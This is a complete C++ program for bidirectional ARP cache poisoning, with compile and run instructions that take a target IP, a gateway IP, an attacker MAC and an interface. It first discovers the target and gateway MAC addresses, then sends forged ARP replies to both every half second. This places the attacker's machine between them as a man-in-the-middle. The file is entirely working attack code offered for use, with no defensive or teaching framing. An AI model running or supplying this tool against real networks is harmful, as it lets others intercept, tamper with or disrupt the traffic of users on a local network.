// Compile: g++ -o arp_auto arp_auto.cpp
// Run: sudo ./arp_auto <target_ip> <gateway_ip> <attacker_mac> <iface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <map>
#include <string>

class ARPAutoDiscovery {
private:
    int sock;
    std::string iface, attackerMAC;
    std::map<std::string, std::string> macCache;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    ARPAutoDiscovery(const std::string& i, const std::string& amac)
        : iface(i), attackerMAC(amac) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Send ARP request to discover MAC
    std::string discoverMAC(const std::string& ip) {
        if (macCache.find(ip) != macCache.end()) {
            return macCache[ip];
        }
        
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        memset(eth->ether_dhost, 0xFF, 6);
        macToBytes(attackerMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REQUEST);
        
        macToBytes(attackerMAC, arp->arp_sha);
        inet_pton(AF_INET, "0.0.0.0", arp->arp_spa);
        memset(arp->arp_tha, 0x00, 6);
        inet_pton(AF_INET, ip.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memset(sll.sll_addr, 0xFF, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
        
        // Wait for reply
        uint8_t buffer[42];
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        int bytes = recv(sock, buffer, sizeof(buffer), 0);
        if (bytes >= 42) {
            struct ether_arp* replyARP = (struct ether_arp*)(buffer + 14);
            if (ntohs(replyARP->arp_op) == ARPOP_REPLY) {
                char mac[18];
                snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                         replyARP->arp_sha[0], replyARP->arp_sha[1],
                         replyARP->arp_sha[2], replyARP->arp_sha[3],
                         replyARP->arp_sha[4], replyARP->arp_sha[5]);
                macCache[ip] = mac;
                return mac;
            }
        }
        return "";
    }
    
    void sendPoison(const std::string& srcIP, const std::string& srcMAC,
                    const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void run(const std::string& targetIP, const std::string& gatewayIP) {
        std::cout << "[*] Auto-discovering MACs...\n";
        std::string targetMAC = discoverMAC(targetIP);
        std::string gatewayMAC = discoverMAC(gatewayIP);
        
        if (targetMAC.empty() || gatewayMAC.empty()) {
            std::cerr << "[!] MAC discovery failed\n";
            return;
        }
        
        std::cout << "[*] Target MAC: " << targetMAC << "\n";
        std::cout << "[*] Gateway MAC: " << gatewayMAC << "\n";
        std::cout << "[*] Starting bidirectional poison\n";
        
        while (true) {
            sendPoison(gatewayIP, attackerMAC, targetIP, targetMAC);
            sendPoison(targetIP, attackerMAC, gatewayIP, gatewayMAC);
            usleep(500000);
        }
    }
    
    ~ARPAutoDiscovery() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <gateway_ip> <attacker_mac> <iface>\n";
        return 1;
    }
    ARPAutoDiscovery poison(argv[4], argv[3]);
    poison.run(argv[1], argv[2]);
    return 0;
}
